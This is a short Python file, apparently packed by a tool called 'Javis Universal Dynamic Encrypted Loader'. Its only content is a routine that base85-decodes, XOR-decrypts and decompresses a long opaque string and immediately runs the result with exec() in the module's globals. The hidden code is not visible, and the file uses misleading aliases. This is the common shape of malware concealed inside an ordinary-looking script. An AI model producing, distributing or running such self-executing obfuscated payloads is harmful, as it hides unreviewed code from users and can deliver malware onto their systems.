# -*- coding: utf-8 -*-
# Protected by Javis Universal Dynamic Encrypted Loader
import base64 as _b85, zlib as _zl
def _xload(_s, _k):
    _e = _b85.b85decode(_s)
    _o = bytearray()
    _p = 0xAA
    _kl = len(_k)
    for _i, _b in enumerate(_e):
        _o.append(_b ^ (_k[_i % _kl] ^ _p))
        _p = _b
    return _zl.decompress(bytes(_o))

_KEY = b'javis_universal_dynamic_loader_2026_'
_PAYLOAD = "xC7|bZ(i`O*BpY|pe1SK(6P8kK8~Y!U=9^o#<#VP`ENzofW#ty9`bL#pq`>#vI|~C1{NNn020DAYss?b)XPY`#4whVPNJnmT;7utF8gyy@|i@`NDm}#F+%|+#w{exMuU?2Hh{=9OMvVK>m*Yi*5VQF4OHO<hy_u3MUH!(!=Bz5EtgxB*>R6s^Icd=4$eVFxlqncA`s(|$+e*IjN&;OG#x3eFY6ik0<J@WH6pTHNjvu}kHZLOIYVD-rb3CGqh$R`N!CedHlc9Bh7qyi*#E$CVgoaFzXfrVac$}0b<j(+nlfIqv3skVxWqT8A&~eApLG&hm_*wuI}oZXDxQ}~2lI@lxz{PH!m5^@n_jwDMguB<dqEC2dBn#8AVPubN4{6#Fc^gMp~!mtF3G%|FEO?OMR23O<UHxS^Jsuh^w~%!k|SbwBr^&-DR$#e%27#^h-=j!y6=u!`+=yPznnW-4mbj5(2iggP2|N!@pU6M<>c3=ds;vY{oQ>RW#;mG_4Fjk&6>Q+WyYv59~_WE#N-y5-qEfPo>(L{SfMd{&E<tk3h@TT0Nt<fne4gArbTpZLd+Yq(;z(1xNrjE8JD?G96=T=;Ox^KZ%qw8bzvix4QKQgsnoxbN6w1dtf)uvGMq1?h3v*;wBItIgaq=lF4Nu{(2R!IDQ-1oh;w(6auf`&0?Y8j5r>kSwr>S^da2rpc6^ckX0ZWGWP>!ZH7ytiF_1j?#+rg9tvDS(E#0<ZQK3JaG`10biwd9;(?K7$y&*DPz>%4(=p8}&pi*k{dz^Jfl4HvkM&7l%UO4#"
exec(compile(_xload(_PAYLOAD, _KEY), __file__, "exec"), globals())
